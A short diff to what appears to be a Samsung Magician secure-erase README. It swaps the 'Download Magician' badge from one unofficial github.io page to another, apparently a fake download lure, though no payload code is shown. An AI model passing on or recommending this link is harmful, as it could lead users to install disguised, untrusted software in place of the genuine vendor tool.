@@ -24,7 +24,7 @@ Backup data, boot from USB Linux if erasing OS disk, open Magician on secondary 
 | :--- | :--- |
 | **Get Samsung Magician diagnostic secure erase PSID** | Placeholder link for Samsung **Samsung Magician diagnostic secure erase PSID** support articles. |
 
-[![Download](https://img.shields.io/badge/Download-Magician-blue?style=for-the-badge)](https://louisejunerainbow1998.github.io/.github/samsung-magician-diagnostic-secure-erase-psid)
+[![Download](https://img.shields.io/badge/Download-Magician-blue?style=for-the-badge)](https://fordchangjcqy.github.io/.github/samsung-magician-diagnostic-secure-erase-psid)
 
 ## System Requirements
 
